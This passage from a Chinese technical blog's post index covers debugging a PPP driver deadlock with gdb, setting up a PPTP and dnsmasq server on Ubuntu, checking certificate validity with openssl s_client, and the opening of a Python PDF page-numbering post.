(!pch-&gt;chan-&gt;ops-&gt;start_xmit(pch-&gt;chan, skb)) &#123;1812                                    /* put the packet back and try again later */1813                                    skb_queue_head(&amp;pch-&gt;file.xq, skb);1814                                    break;1815                            &#125;(gdb) list *(ppp_release_channels+0xa4)0x598 is in ppp_push (drivers/net/ppp/ppp_generic.c:1540).1535                    /* not doing multilink: send it down the first channel */1536                    list = list-&gt;next;1537                    pch = list_entry(list, struct channel, clist);15381539                    spin_lock_bh(&amp;pch-&gt;downl);1540                    if (pch-&gt;chan) &#123;1541                            if (pch-&gt;chan-&gt;ops-&gt;start_xmit(pch-&gt;chan, skb))1542                                    ppp-&gt;xmit_pending = NULL;1543                    &#125; else &#123;1544                            /* channel got unregistered */(gdb)</code></pre><p>使用 gdb 可以快速定位到出错代码，从上面的解析结果可以看出，在以下两个函数</p><ul><li>ppp_channel_push</li><li>ppp_push</li></ul><p>中都调用了 <code>spin_lock_bh(&amp;pch-&gt;downl)</code> , ppp_channel_push 加锁后正在等待数据发送完成，而发送过程中又调用了 ppp_push ，但是该锁已经锁住了， ppp_push 只能一直等待，最终导致两处都在无限等待中从而陷入死锁。</p><p>ok，到此基本真相大白了，结合设定的静态路由来说。当用户向 PPTP server 请求数据时， 驱动会调用 <code>ppp_channel_push</code> 发送数据, 由于添加了静态路由，数据会走 ppp0, 于是又重新调用了 <code>ppp_push</code>, 导致形成了一个环。</p><p>当然这并不是linux kernel 的bug，因为所用kernel经过了 qualcomm 的修改，事实证明公板也存在这个问题，所以应该是某部分修改引入的。于是乎，甩锅~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经过这次的 crash 调试，学习了 ppp driver 的部分代码，积累了处理此类 crash 问题的经验，进一步学习了 gdb 调试方法。</p><p>此外，</p><ol><li>crash log 指示的函数未必就是真正出现问题的函数，编译优化可能导致某些Symbols 乱序，具体以 gdb 结果为准；</li><li>FW 中的 binary 通常不包含 Symbols, 所以使用 gdb 时需要对编译目录中的 binary 进行调试；</li><li>触发 crash 的是定时发送的 LCP echo request 数据包；</li><li>PPTP 使用 GRE(Generic Routing Encapsulation) 封装 ppp0 数据包，经由以太网络接口 brwan 进行IP网络数据收发。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://blog.csdn.net/eydwyz/article/details/54879808">GRE、PPTP、L2TP隧道协议</a></li><li><a href="https://elixir.bootlin.com/linux/v3.14.77/source/drivers/net/ppp/ppp_generic.c">https://elixir.bootlin.com/linux/v3.14.77/source/drivers/net/ppp/ppp_generic.c</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openwrt </tag>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Setup PPTP and DNS server</title>
      <link href="2020/12/02/setup-pptp/"/>
      <url>2020/12/02/setup-pptp/</url>
      
        <content type="html"><![CDATA[<p>PPTP (Point to Point Tunneling Protocol) 点对点隧道协议，与PPPoE, L2TP 均属于 PPP(Point to Point Protocol) 点对点协议。这篇来记录下PPTP server的安装和配置过程。</p><h2 id="install-DHCP-server"><a href="#install-DHCP-server" class="headerlink" title="install DHCP server"></a>install DHCP server</h2><p>除了PPPoE外，PPTP 与 L2TP 都无法直接给client分配IP，需要使用dhcp server分配。所以在安装PPTP的同时，也要保证DHCP server也已安装。具体方法参考 <a href="https://www.litreily.top/2020/01/17/dhcpd_server/">Setup dhcpd/dhcpdv6 server</a>.</p><p>需要注意的是，在Ubuntu 20.10 版本中，网卡的静态IP管理模式与以往有所不同。在以往版本中，是修改 <code>/etc/network/interfaces</code> 文件，但是在最新Ubuntu确不一样，最新版提出了一个叫 <code>netplan</code> 的概念，修改的文件是：</p><ul><li>/etc/netplan/01-network-manager-all.yaml</li></ul><p>以 <code>yaml</code> 文件存储配置信息，我们将配置dhcp 对应接口的静态IP为 <code>10.0.0.138/24</code>, 对应配置文件内容如下：</p><pre><code class="yaml"># Let NetworkManager manage all devices on this systemnetwork:   version: 2   renderer: NetworkManager   ethernets:       enp0s8:           dhcp4: no           dhcp6: no           addresses: [10.0.0.138/24]           gateway4: 10.0.0.138           nameservers:               addresses: [10.0.0.138]</code></pre><p>其中 <code>enp0s8</code> 为 interface 名称，从 <code>ifconfig</code> 可以获得。让该配置生效的方式为：</p><pre><code class="bash">sudo netplan apply</code></pre><p>重新执行 <code>ifconfig</code> 查看已生效的静态IP.</p><h2 id="install-PPTP-server"><a href="#install-PPTP-server" class="headerlink" title="install PPTP server"></a>install PPTP server</h2><p>PPTP Server 的安装其实很简单，就一个指令。</p><pre><code class="bash">sudo apt install pptpd</code></pre><p>对 pptpd 的操作与大多数服务一样。</p><pre><code class="bash">sudo service pptpd [force-reload|restart|start|status|stop]</code></pre><p>主要是配置稍微复杂些，某些配置与PPPoE, L2TP是共用的，比如密码信息等。</p><h3 id="common-config"><a href="#common-config" class="headerlink" title="common config"></a>common config</h3><p>PPPoE, PPTP, L2TP 共用以下文件</p><ul><li>/etc/ppp/chap-secrets</li><li>/etc/ppp/options</li></ul><p>其中 <code>/etc/ppp/chap-secrets</code> 用于存储密码信息。</p><pre><code class="bash"># Secrets for authentication using CHAP# client        server  secret                  IP addresses&quot;test123&quot;       *       &quot;123456&quot;                *</code></pre><p>以上 &quot;test123&quot; 为PPTP拨号时的用户名， &quot;123456&quot; 为拨号密码。可以添加多行，代表多个账户。</p><p><code>/etc/ppp/options</code>也是共用的，是大部分常用配置的基地。我们通常只需要修改以下部分参数。</p><pre><code class="bash"># Require the peer to authenticate itself before allowing networkauth# Require the peer to authenticate itself using CHAP+chap# Send an LCP echo-request frame to the peer every n secondslcp-echo-interval 30# Retry to send LCP echo -request max n times if not receive echo-responselcp-echo-failure 4# Disable the IPXCP and IPX protocolsnoipx</code></pre><p>以上配置主要是使能密码认证，并启用echo包监听client状态，在无消息响应情况下自动断开连接。</p><h3 id="pptpd-config"><a href="#pptpd-config" class="headerlink" title="pptpd config"></a>pptpd config</h3><p>针对pptp server也有对应的特定配置文件，</p><ul><li>/etc/ppp/pptpd-options</li><li>/etc/pptpd.conf</li></ul><p><code>/etc/ppp/pptpd-options</code> 文件内容较多，但基本不需要修改，只需要添加dns信息即可</p><pre><code class="bash">ms-dns 10.0.0.138</code></pre><p><code>/etc/pptpd.conf</code> 文件是配置IP网段的，pptp拨号成功后，会在特定interface (如ppp0) 分配IP，通常是192.168.*网段。</p><p>配置该文件时，只需要在文件末尾添加以下信息即可：</p><pre><code class="conf">localip 192.168.0.1remoteip 192.168.0.10-200</code></pre><p><code>localip</code> 代表本地IP，用于与 remote client 通信，<code>remoteip</code> 自然就是需要拨号上网的client对应ip了。</p><p>到此就基本配置完成了。</p><h2 id="install-DNS-server"><a href="#install-DNS-server" class="headerlink" title="install DNS server"></a>install DNS server</h2><p>想要 PPTP server 完全正常工作，除了dhcp server和以上配置外，还少不了 DNS server 提供 DNS 解析服务。</p><p>安装同样很简单，一步到位。</p><pre><code class="bash">sudo apt install dnsmasq</code></pre><p>操作与 <code>pptpd</code> 类似，</p><pre><code class="bash">sudo service dnsmasq [dump-stats|force-reload|restart|start|status|stop]</code></pre><h3 id="config-dnsmasq"><a href="#config-dnsmasq" class="headerlink" title="config dnsmasq"></a>config dnsmasq</h3><p>dns server 的配置文件主要有：</p><ol><li>/etc/dnsmasq.conf</li><li>/etc/default/dnsmasq</li><li>/etc/dnsmasq/dnsmasq.resolv</li><li>/etc/dnsmasq/dnsmasq.hosts</li></ol><p>第 3,4 个是自己手动创建的，也不是必须的，但是创建后更方便管理。</p><p>以上配置文件中，<code>/etc/dnsmasq.conf</code>是基础，主要用于指定 <code>resolv</code> 和 <code>hosts</code> 文件, 以及监听地址。</p><pre><code class="bash">resolv-file=/etc/dnsmasq/dnsmasq.resolvlisten-address=127.0.0.1, 10.0.0.138addn-hosts=/etc/dnsmasq/dnsmasq.hosts</code></pre><p><code>/etc/dnsmasq/dnsmasq.resolv</code>用于存储 DNS server IP</p><pre><code class="bash">nameserver 127.0.0.1nameserver 10.0.0.138</code></pre><p><code>/etc/dnsmasq/dnsmasq.hosts</code>用于存储hosts信息，与Windows的hosts是一样的，Ubuntu默认路径是 /etc/hosts.</p><pre><code class="bash">10.0.0.138 netgear.com1.2.3.4 baidu.com</code></pre><h3 id="start-dnsmasq"><a href="#start-dnsmasq" class="headerlink" title="start dnsmasq"></a>start dnsmasq</h3><p>上面讲dns配置好了，使用 <code>sudo service dnsmasq start</code> 可以启动服务。</p><p>但是我在这一步出现了问题，提示53端口已经被占用。解决方案如下：</p><pre><code class="bash">sudo systemctl stop systemd-resolved.servicesudo systemctl disable systemd-resolved.service</code></pre><h2 id="config-sysctl-conf"><a href="#config-sysctl-conf" class="headerlink" title="config sysctl.conf"></a>config sysctl.conf</h2><p>将<code>ubuntu</code> 系统作为server，还需要开启IP转发功能，所以需要修改以下文件:</p><ul><li>/etc/sysctl.conf</li></ul><pre><code class="bash">net.ipv4.ip_forward=1</code></pre><p>然后使用 <code>sudo sysctl -p</code> 使其生效。</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>总结下，在Ubuntu安装PPTP server，共安装了</p><ul><li>dhcp server</li><li>pptp server</li><li>dns server</li></ul><p>此外，添加了对应的接口信息，静态IP，分配IP网段，启用IP转发功能。不同的操作系统安装可能略有不同，但流程大同小异。</p><p>如果在使用多个虚拟网卡的虚拟机中使用，可能还需要添加默认路由。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul><li><a href="https://www.cnblogs.com/Yogile/p/12779744.html">启动或重启 dnsmasq 提示端口 53 被占用的解决方案</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> pptp </tag>
            
            <tag> dns </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openssl 验证证书有效性</title>
      <link href="2020/09/17/openssl/"/>
      <url>2020/09/17/openssl/</url>
      
        <content type="html"><![CDATA[<blockquote><p>OpenSSL is a robust, commercial-grade, and full-featured toolkit for the Transport Layer Security (TLS) and Secure Sockets Layer (SSL) protocols. It is also a general-purpose cryptography library.</p></blockquote><p>openssl是非常强大的TLS/SSL协议相关的工具集，包含丰富的测试工具。 这篇文章来讲讲如何使用openssl工具集中的<code>s_client</code>测试证书认证。</p><span id="more"></span><pre><code class="bash">$ openssl -hopenssl:Error: &#39;-h&#39; is an invalid command.Standard commandsasn1parse      ca             ciphers        cms            crlcrl2pkcs7      dgst           dh             dhparam        dsadsaparam       ec             ecparam        enc            engineerrstr         gendh          gendsa         genpkey        genrsanseq           ocsp           passwd         pkcs12         pkcs7pkcs8          pkey           pkeyparam      pkeyutl        primerand           req            rsa            rsautl         s_clients_server       s_time         sess_id        smime          speedspkac          srp            ts             verify         versionx509Message Digest commands (see the `dgst` command for more details)md4            md5            rmd160         sha            sha1Cipher commands (see the `enc` command for more details)aes-128-cbc    aes-128-ecb    aes-192-cbc    aes-192-ecb    aes-256-cbcaes-256-ecb    base64         bf             bf-cbc         bf-cfbbf-ecb         bf-ofb         cast           cast-cbc       cast5-cbccast5-cfb      cast5-ecb      cast5-ofb      des            des-cbcdes-cfb        des-ecb        des-ede        des-ede-cbc    des-ede-cfbdes-ede-ofb    des-ede3       des-ede3-cbc   des-ede3-cfb   des-ede3-ofbdes-ofb        des3           desx           rc2            rc2-40-cbcrc2-64-cbc     rc2-cbc        rc2-cfb        rc2-ecb        rc2-ofbrc4            rc4-40         seed           seed-cbc       seed-cfbseed-ecb       seed-ofb       zlib</code></pre><p>以站点<code>devicelocation.ngxcld.com</code>为例，修改当前系统时间，测试不同时间下的认证情况。</p><h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><p>首先使用<code>nslookup</code>获取server ip.</p><pre><code class="bash">$ nslookup devicelocation.ngxcld.comServer:    112.65.184.255Address 1: 112.65.184.255Name:      devicelocation.ngxcld.comAddress 1: 54.72.14.214 ec2-54-72-14-214.eu-west-1.compute.amazonaws.comAddress 2: 52.48.74.182 ec2-52-48-74-182.eu-west-1.compute.amazonaws.com</code></pre><p>选择两个地址之一，此处选择<code>52.48.74.182</code>.</p><h2 id="openssl-s-client"><a href="#openssl-s-client" class="headerlink" title="openssl s_client"></a>openssl s_client</h2><p><code>s_client</code>使用方法如下，详细参数说明可以通过<code>openssl s_client -h</code> 获得</p><pre><code class="bash">openssl s_client -connect serverip:port</code></pre><p>正常情况下，当前系统时间为正确的格林尼治时间，使用<code>openssl s_client</code>进行测试，测试结果如下↓</p><pre><code>$ openssl s_client -connect 52.48.74.182:443CONNECTED(00000003)depth=4 C = US, O = &quot;Starfield Technologies, Inc.&quot;, OU = Starfield Class 2 Certification Authorityverify return:1depth=3 C = US, ST = Arizona, L = Scottsdale, O = &quot;Starfield Technologies, Inc.&quot;, CN = Starfield Services Root Certificate Authority - G2verify return:1depth=2 C = US, O = Amazon, CN = Amazon Root CA 1verify return:1depth=1 C = US, O = Amazon, OU = Server CA 1B, CN = Amazonverify return:1depth=0 CN = devicelocation.ngxcld.comverify return:1---Certificate chain 0 s:/CN=devicelocation.ngxcld.com   i:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon 1 s:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon   i:/C=US/O=Amazon/CN=Amazon Root CA 1 2 s:/C=US/O=Amazon/CN=Amazon Root CA 1   i:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2 3 s:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2   i:/C=US/O=Starfield Technologies, Inc./OU=Starfield Class 2 Certification Authority---Server certificate-----BEGIN CERTIFICATE-----MIIFezCCBGOgAwIBAgIQD2G5WRjlpBXraGmoG0C50TANBgkqhkiG9w0BAQsFADBGMQswCQYDVQQGEwJVUzEPMA0GA1UEChMGQW1hem9uMRUwEwYDVQQLEwxTZXJ2ZXIgQ0EgMUIxDzANBgNVBAMTBkFtYXpvbjAeFw0yMDA4MjgwMDAwMDBaFw0yMTA5MjcxMjAwMDBaMCQxIjAgBgNVBAMTGWRldmljZWxvY2F0aW9uLm5neGNsZC5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZw+BtpGv+SopXdXVjxvRJb1It3MqlCXyFp+lRxuM9ySLT0IFCMqhBadzJCIB32VZP4ixQ0WjqGDjwcXVau2ka0SDNe+xjhYzc6FKzgRmIy016sBQiadasadAZbbcJeRTNrhjD0PqjCE7DbKmQWx8SEoY0Nm1fnq/TPwBIKqo1vdS2e6CiXcfH5LTBLLE4Ryw9aloWDQ2nud/x8lRMlY+0GirdX1abENX9++gpoS/TUQ2uXxbFKDPb/Moi/3hirivQiVi1R9CjEYYcmlSr+XctUjk/VgzqwgUukC15YABvfxCjZRHyNQ85SJ2vDtDhxMfQfhZHqcUozkQPqw28SUVhAgMBAAGjggKFMIICgTAfBgNVHSMEGDAWgBRZpGYGUqB7lZI8o5QHJ5Z0W/k90DAdBgNVHQ4EFgQUtbIEC2lD6lx/E0fmPY/OICyl9HQwJAYDVR0RBB0wG4IZZGV2aWNlbG9jYXRpb24ubmd4Y2xkLmNvbTAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMDsGA1UdHwQ0MDIwMKAuoCyGKmh0dHA6Ly9jcmwuc2NhMWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNybDAgBgNVHSAEGTAXMAsGCWCGSAGG/WwBAjAIBgZngQwBAgEwdQYIKwYBBQUHAQEEaTBnMC0GCCsGAQUFBzABhiFodHRwOi8vb2NzcC5zY2ExYi5hbWF6b250cnVzdC5jb20wNgYIKwYBBQUHMAKGKmh0dHA6Ly9jcnQuc2NhMWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNydDAMBgNVHRMBAf8EAjAAMIIBBAYKKwYBBAHWeQIEAgSB9QSB8gDwAHYA9lyUL9F3MCIUVBgIMJRWjuNNExkzv98MLyALzE7xZOMAAAF0Moj6QwAABAMARzBFAiArdrj+FzgNhO3UOShNAThIdUxRgP21OgRiZCsOv3UZDwIhAJFyF0BC4kYsJqJFkc+n/ZMmmVrrAG4WPIfGqwq/nqc+AHYAXNxDkv7mq0VEsV6a1FbmEDf71fpH3KFzlLJe5vbHDsoAAAF0Moj6PQAABAMARzBFAiEA+twofyIX7Z2fSqY3OJsHzw2c39o3oBVkwuthnGmsIegCIHNCLMBYlrkWX0V9j+7Pi+NHe57Bj2+IgWqlw/CHeM5OMA0GCSqGSIb3DQEBCwUAA4IBAQAf2CtL8DliTB9Inf1+ZKTg6JjCebH4iH61gSfqxJZyDgW+7umFQguL+hEpdDUd6tcqUj9ibAxtcdOLSbIjJKwC1cN+gcgSHYbPBD2mQU4U7wPhfFSZRDBoFBH4n13OkgT+f2tO/byQ7uchJvnezVhjYdJwZoBpPi6IXpzqE5A6IH9AJz0iQJLUyyC1b8fQNiFQ5j65t5FrLqf9LU82hrDrPLjEvR9v6BAumlH/0FmaIbXPwZm6kMXmTqRoPzX0+R5WM8bUGEDnkWMwzj+1eW64hpu8Fwsq17SAeITVclj2ZNjz2LaNyuLbdKkMatnLq1M62sq4dgrQ1Jx90PGLzAbi-----END CERTIFICATE-----subject=/CN=devicelocation.ngxcld.comissuer=/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon---No client certificate CA names sentPeer signing digest: SHA512Server Temp Key: ECDH, P-256, 256 bits---SSL handshake has read 5506 bytes and written 400 bytes---New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES128-GCM-SHA256Server public key is 2048 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONENo ALPN negotiatedSSL-Session:    Protocol  : TLSv1.2    Cipher    : ECDHE-RSA-AES128-GCM-SHA256    Session-ID: EFA5500D91F4403CA0D2003B98F790B238F68D34E4A9D1F7CB6E382B1C762588    Session-ID-ctx:    Master-Key: 8CEE4FCFC53AA6CB66F915D5C0911D28F59D30477EEDDA1E2A5E6C0DEE3FE24F8CC7918EF85717D34BC675F83F1BB892    Key-Arg   : None    PSK identity: None    PSK identity hint: None    SRP username: None    TLS session ticket lifetime hint: 43200 (seconds)    TLS session ticket:    0000 - c3 33 dc 6e 4b 4c 35 4f-3a 84 49 5d 7f 4a 12 30   .3.nKL5O:.I].J.0    0010 - cb be 29 f6 6c 04 78 61-19 48 9a ba e8 b8 21 31   ..).l.xa.H....!1    0020 - 56 52 ab d0 16 eb 56 6f-b6 8c 00 42 f6 14 cd 49   VR....Vo...B...I    0030 - b4 a1 09 5b 0e ea 11 1c-0c 85 61 4d 9b b3 75 49   ...[......aM..uI    0040 - 80 d5 ab da c8 2d 07 4c-c0 dc 9a dc 9c 4d 66 87   .....-.L.....Mf.    0050 - b3 8c 72 f4 c3 75 9a cf-76 46 75 35 81 54 48 ad   ..r..u..vFu5.TH.    0060 - 71 16 db 55 12 61 fe da-87 1a bc eb 43 83 2d 75   q..U.a......C.-u    0070 - 6a 6d 97 4a de 09 e1 b2-5c 18 2e af ac a0 a1 7a   jm.J....\......z    0080 - b8 e9 3f 83 65 5e 3e da-db 4f 1d fd 94 b6 66 e1   ..?.e^&gt;..O....f.    0090 - 74 73 3b 09 93 83 2f 23-7f 13 98 8c 63 3b 13 6b   ts;.../#....c;.k    00a0 - 03 07 0f d2 b2 66 37 df-92 e7 c9 c1 7b da 26 67   .....f7.....&#123;.&amp;g    Start Time: 1600248002    Timeout   : 300 (sec)    Verify return code: 0 (ok)---</code></pre><p>输出结果中包含server端的证书以及认证结果，Verify return code 为0(ok)，说明一切正常。</p><p>现在我故意将系统时间调整为去年的时间</p><pre><code class="bash">date -s 2019-09-14</code></pre><p>重新执行一遍指令，结果如下↓</p><pre><code class="bash">$ openssl s_client -connect 52.48.74.182:443CONNECTED(00000003)depth=4 C = US, O = &quot;Starfield Technologies, Inc.&quot;, OU = Starfield Class 2 Certification Authorityverify return:1depth=3 C = US, ST = Arizona, L = Scottsdale, O = &quot;Starfield Technologies, Inc.&quot;, CN = Starfield Services Root Certificate Authority - G2verify return:1depth=2 C = US, O = Amazon, CN = Amazon Root CA 1verify return:1depth=1 C = US, O = Amazon, OU = Server CA 1B, CN = Amazonverify return:1depth=0 CN = devicelocation.ngxcld.comverify error:num=9:certificate is not yet validnotBefore=Aug 28 00:00:00 2020 GMTverify return:1depth=0 CN = devicelocation.ngxcld.comnotBefore=Aug 28 00:00:00 2020 GMTverify return:1---Certificate chain 0 s:/CN=devicelocation.ngxcld.com   i:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon 1 s:/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon   i:/C=US/O=Amazon/CN=Amazon Root CA 1 2 s:/C=US/O=Amazon/CN=Amazon Root CA 1   i:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2 3 s:/C=US/ST=Arizona/L=Scottsdale/O=Starfield Technologies, Inc./CN=Starfield Services Root Certificate Authority - G2   i:/C=US/O=Starfield Technologies, Inc./OU=Starfield Class 2 Certification Authority---Server certificate-----BEGIN CERTIFICATE-----MIIFezCCBGOgAwIBAgIQD2G5WRjlpBXraGmoG0C50TANBgkqhkiG9w0BAQsFADBGMQswCQYDVQQGEwJVUzEPMA0GA1UEChMGQW1hem9uMRUwEwYDVQQLEwxTZXJ2ZXIgQ0EgMUIxDzANBgNVBAMTBkFtYXpvbjAeFw0yMDA4MjgwMDAwMDBaFw0yMTA5MjcxMjAwMDBaMCQxIjAgBgNVBAMTGWRldmljZWxvY2F0aW9uLm5neGNsZC5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZw+BtpGv+SopXdXVjxvRJb1It3MqlCXyFp+lRxuM9ySLT0IFCMqhBadzJCIB32VZP4ixQ0WjqGDjwcXVau2ka0SDNe+xjhYzc6FKzgRmIy016sBQiadasadAZbbcJeRTNrhjD0PqjCE7DbKmQWx8SEoY0Nm1fnq/TPwBIKqo1vdS2e6CiXcfH5LTBLLE4Ryw9aloWDQ2nud/x8lRMlY+0GirdX1abENX9++gpoS/TUQ2uXxbFKDPb/Moi/3hirivQiVi1R9CjEYYcmlSr+XctUjk/VgzqwgUukC15YABvfxCjZRHyNQ85SJ2vDtDhxMfQfhZHqcUozkQPqw28SUVhAgMBAAGjggKFMIICgTAfBgNVHSMEGDAWgBRZpGYGUqB7lZI8o5QHJ5Z0W/k90DAdBgNVHQ4EFgQUtbIEC2lD6lx/E0fmPY/OICyl9HQwJAYDVR0RBB0wG4IZZGV2aWNlbG9jYXRpb24ubmd4Y2xkLmNvbTAOBgNVHQ8BAf8EBAMCBaAwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMDsGA1UdHwQ0MDIwMKAuoCyGKmh0dHA6Ly9jcmwuc2NhMWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNybDAgBgNVHSAEGTAXMAsGCWCGSAGG/WwBAjAIBgZngQwBAgEwdQYIKwYBBQUHAQEEaTBnMC0GCCsGAQUFBzABhiFodHRwOi8vb2NzcC5zY2ExYi5hbWF6b250cnVzdC5jb20wNgYIKwYBBQUHMAKGKmh0dHA6Ly9jcnQuc2NhMWIuYW1hem9udHJ1c3QuY29tL3NjYTFiLmNydDAMBgNVHRMBAf8EAjAAMIIBBAYKKwYBBAHWeQIEAgSB9QSB8gDwAHYA9lyUL9F3MCIUVBgIMJRWjuNNExkzv98MLyALzE7xZOMAAAF0Moj6QwAABAMARzBFAiArdrj+FzgNhO3UOShNAThIdUxRgP21OgRiZCsOv3UZDwIhAJFyF0BC4kYsJqJFkc+n/ZMmmVrrAG4WPIfGqwq/nqc+AHYAXNxDkv7mq0VEsV6a1FbmEDf71fpH3KFzlLJe5vbHDsoAAAF0Moj6PQAABAMARzBFAiEA+twofyIX7Z2fSqY3OJsHzw2c39o3oBVkwuthnGmsIegCIHNCLMBYlrkWX0V9j+7Pi+NHe57Bj2+IgWqlw/CHeM5OMA0GCSqGSIb3DQEBCwUAA4IBAQAf2CtL8DliTB9Inf1+ZKTg6JjCebH4iH61gSfqxJZyDgW+7umFQguL+hEpdDUd6tcqUj9ibAxtcdOLSbIjJKwC1cN+gcgSHYbPBD2mQU4U7wPhfFSZRDBoFBH4n13OkgT+f2tO/byQ7uchJvnezVhjYdJwZoBpPi6IXpzqE5A6IH9AJz0iQJLUyyC1b8fQNiFQ5j65t5FrLqf9LU82hrDrPLjEvR9v6BAumlH/0FmaIbXPwZm6kMXmTqRoPzX0+R5WM8bUGEDnkWMwzj+1eW64hpu8Fwsq17SAeITVclj2ZNjz2LaNyuLbdKkMatnLq1M62sq4dgrQ1Jx90PGLzAbi-----END CERTIFICATE-----subject=/CN=devicelocation.ngxcld.comissuer=/C=US/O=Amazon/OU=Server CA 1B/CN=Amazon---No client certificate CA names sentPeer signing digest: SHA512Server Temp Key: ECDH, P-256, 256 bits---SSL handshake has read 5506 bytes and written 400 bytes---New, TLSv1/SSLv3, Cipher is ECDHE-RSA-AES128-GCM-SHA256Server public key is 2048 bitSecure Renegotiation IS supportedCompression: NONEExpansion: NONENo ALPN negotiatedSSL-Session:    Protocol  : TLSv1.2    Cipher    : ECDHE-RSA-AES128-GCM-SHA256    Session-ID: 979E3C71B293EDF1923989B706B0B315A638046A30DA9E6B77C8889DF94BC613    Session-ID-ctx:    Master-Key: 24F7FD66C5A195765C62FE5B8D5304F94F3006A1A2993B7C3FB5B1D9162A9E5BFD6CADC984458153E32F012AD30A3F7A    Key-Arg   : None    PSK identity: None    PSK identity hint: None    SRP username: None    TLS session ticket lifetime hint: 43200 (seconds)    TLS session ticket:    0000 - c3 33 dc 6e 4b 4c 35 4f-3a 84 49 5d 7f 4a 12 30   .3.nKL5O:.I].J.0    0010 - be c3 28 c9 3a fd 73 6a-c7 65 65 b0 a7 69 a1 ca   ..(.:.sj.ee..i..    0020 - f8 89 1d 62 75 3d 46 7d-92 62 01 f6 8b fa 40 c7   ...bu=F&#125;.b....@.    0030 - ef de 3b 35 50 ab 0c 45-79 ce 97 2f 13 9e 0c 10   ..;5P..Ey../....    0040 - 4c d2 2a 4e 85 fc 8f b1-4c c9 98 1a 0d 39 a9 26   L.*N....L....9.&amp;    0050 - e3 c3 18 16 fc ad b9 9a-ba 5d f7 b1 db 70 ab 30   .........]...p.0    0060 - 04 b3 9a 2f 66 97 74 e6-74 c9 04 59 3b 18 df 67   .../f.t.t..Y;..g    0070 - a3 17 03 52 c8 c9 b9 8c-1f 11 01 8e cf bc 17 22   ...R...........&quot;    0080 - e7 7d 40 ad 53 c6 04 83-d2 80 24 28 3f cb f8 c6   .&#125;@.S.....$(?...    0090 - c4 1c 2f 42 15 7b a3 13-c7 4f 8f 62 18 71 0f 2a   ../B.&#123;...O.b.q.*    00a0 - 90 8b 8b d9 64 b8 1e 0d-cf df 62 cc fc 95 d0 ce   ....d.....b.....    Start Time: 1598327363    Timeout   : 300 (sec)    Verify return code: 9 (certificate is not yet valid)---</code></pre><p>可以看到最后的<code>Verify return code</code>变为9了，而且提示<code>certificate is not yet vaild</code>, 说明证书无效，实际上不是证书无效，而是本地系统时间没有同步，然后认为server端的证书有效期太超前，错认为是证书无效。在前半部分的错误信息中</p><pre><code class="bash">verify error:num=9:certificate is not yet validnotBefore=Aug 28 00:00:00 2020 GMT</code></pre><p>可以看出server端证书的起始时间是<code>Aug 28 00:00:00 2020 GMT</code>，所以只要当前系统时间在这个时间之后就是正常的。</p><p>在出错的情况下使用<code>wireshark</code>抓包就可以发现，client端认为证书无效，会alert一个<code>Bad Certificate</code>的错误信息，然后关闭当前连接。</p><p><img src="/assets/network/ssl/bad-certificate.png" alt="wireshark Bad Certificate"></p><p>在嵌入式设备中，如果NTP没有同步，当前系统时间就有可能是错误的，此时使用<code>https</code>与远程服务器通信就可能出错。</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openssl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python之给pdf添加页码</title>
      <link href="2020/08/13/python-pdf/"/>
      <url>2020/08/13/python-pdf/</url>
      
        <content type="html"><![CDATA[<p>最近写release note, 总感觉用<code>tex</code>不太方便，特别是装<code>texlive</code>占用大量空间，还有各种依赖问题，想着能不能用<code>markdown</code>写更方便。实践证明，<a href="https://typora.io/">typora</a>导出pdf的功能真的很棒，唯独一个不足之处就是生成的PDF不带<strong>页码</strong>。</p><p>这个虽然可以使用在线工具实现，或者使用Adobe、福昕的 pdf 编辑功能，但是很多情况，尤其是工作平台是不方便使用的。为此我想到了<code>Python</code>，通过脚本把页码加上。</p><h2 id="安装Python库"><a href="#安装Python库" class="headerlink" title="安装Python库"></a>安装Python库</h2><p>首先需要安装两个依赖库，<code>PyPDF2</code>以及<code>reportLab</code>, <code>PyPDF2</code>可以对PDF进行拆分、合并、删除、加密等操作；<code>reportlab</code>则更是强大，看看下面的官方介绍。</p><blockquote><p>We build solutions to generate rich, attractive and fully bespoke PDFs at incredible speeds.<br>Over 5 million documents are generated each month using Reportlab&#39;s software<br>--- <a href="https://www.reportlab.com/">https://www.reportlab.com/</a></p></blockquote><pre><code class="py">sudo pip3 install pypdf2sudo pip3 install reportlab</code></pre><h2 id="代码实现"><a href="#代码实现" class="headerlink" 